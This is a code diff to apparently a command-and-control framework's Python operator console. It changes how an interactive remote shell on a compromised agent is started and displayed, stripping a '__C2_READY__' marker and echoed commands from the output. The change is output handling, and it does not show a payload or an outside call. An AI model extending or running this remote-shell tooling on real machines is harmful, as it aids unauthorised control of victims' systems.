@@ -111,21 +111,19 @@ def revshell(manager, agent_id, c2_server):
 
 
 def _fast_http_shell(manager, agent_id):
-    _write(f"{Fore.CYAN}[*] Fast HTTP PTY shell{Style.RESET_ALL}\n")
-    _write(f"{Fore.CYAN}[*] Type 'exit' to return{Style.RESET_ALL}\n\n")
+    _write(f"{Fore.CYAN}[*] Connecting...{Style.RESET_ALL}\n")
 
-    # Use shell_interactive (persistent PTY bash), not SHELL: protocol
-    cmd = "echo SHELL_READY"
+    cmd = "echo __C2_READY__"
     tid = manager.send_task(agent_id, "shell_interactive", {"command": cmd})
-    if not tid:
-        _write("[!] Agent unreachable\n")
-        return
 
     for _ in range(20):
         time.sleep(0.5)
         for r in manager.consume_results(agent_id):
+            out = r.get("output", "")
             if r.get("task_id") == tid:
-                _write("[+] Shell ready\n")
+                prompt = out.replace("__C2_READY__\r\n", "").replace("__C2_READY__\n", "").replace("__C2_READY__", "").strip()
+                if prompt:
+                    _write(prompt + " ")
                 break
         else:
             continue
@@ -154,14 +152,17 @@ def _fast_http_shell(manager, agent_id):
             for r in manager.consume_results(agent_id):
                 out = r.get("output", "")
                 if r.get("task_id") == tid:
-                    if out:
-                        _write(out + ("\n" if not out.endswith("\n") else ""))
+                    # Strip echoed command from output
+                    lines = out.split("\n")
+                    if lines and lines[0].strip() == cmd.strip():
+                        out = "\n".join(lines[1:])
+                    if out.rstrip():
+                        _write(out if out.endswith("\n") else out + "\n")
                     break
             else:
                 continue
             break
 
-        # Drain any SHELL_DRAIN results from agent's continuous PTY drain
         for _ in range(4):
             time.sleep(0.3)
             for r in manager.consume_results(agent_id):
